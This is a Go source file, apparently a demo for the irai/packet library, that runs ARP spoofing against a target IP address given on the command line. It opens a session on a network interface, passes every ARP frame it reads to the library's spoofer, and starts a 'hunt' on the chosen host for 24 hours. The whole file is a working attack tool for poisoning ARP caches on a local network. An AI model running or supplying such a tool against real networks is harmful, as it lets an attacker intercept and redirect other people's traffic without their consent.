package main

import (
	"flag"
	"fmt"
	"net"
	"time"

	"github.com/irai/packet"
	"github.com/irai/packet/arp"
)

// Simple utility to demonstrate use of ARP spoofing
var (
	nic   = flag.String("i", "eth0", "nic interface")
	ipstr = flag.String("ip", "", "target ip address as in 192.168.0.30")
	debug = flag.Bool("d", false, "set to true to show debug messages")
)

func main() {
	var err error
	var ip net.IP
	flag.Parse()

	fmt.Println("setting up nic: ", *nic)
	s, err := packet.NewSession(*nic)
	if err != nil {
		fmt.Printf("conn error: %s", err)
		return
	}

	go func() {
		for {
			notification := <-s.C
			switch notification.Online {
			case true:
				fmt.Printf("is online: %s\n", notification)
			default:
				fmt.Printf("is offline: %s\n", notification)
			}
			s.PrintTable()
		}
	}()

	arp.Debug = *debug
	packet.Debug = *debug
	arpspoofer, err := arp.New(s)
	if err != nil {
		fmt.Println("error creating arp spoofer", err)
		return
	}

	// Start packet processing goroutine
	go func() {
		buffer := make([]byte, packet.EthMaxSize)
		for {
			n, _, err := s.ReadFrom(buffer)
			if err != nil {
				fmt.Println("error reading packet", err)
				return
			}

			frame, err := s.Parse(buffer[:n])
			if err != nil {
				fmt.Println("parse error", err)
				continue
			}

			// Process ARP packets only - ignore all other
			if arp := frame.ARP(); arp != nil {
				arpspoofer.Spoof(frame)
			}

			s.SetOnline(frame.Host)
		}
	}()

	// Start arp spoofer module
	arpspoofer.Start()
	defer arpspoofer.Stop()

	// start hunt for target IP
	if ip = net.ParseIP(*ipstr); ip == nil {
		fmt.Println("missing or invalid target ip address...listening only", err)
	} else {
		if addr, err := s.ARPWhoIs(ip); err != nil {
			fmt.Printf("ip=%s not found on LAN - listening only: %v\n", ip, err)
		} else {
			if _, err := arpspoofer.StartHunt(addr); err != nil {
				fmt.Println("error in start hunt", err)
				return
			}
		}
	}

	time.Sleep(time.Hour * 24) // wait forever!!!
}
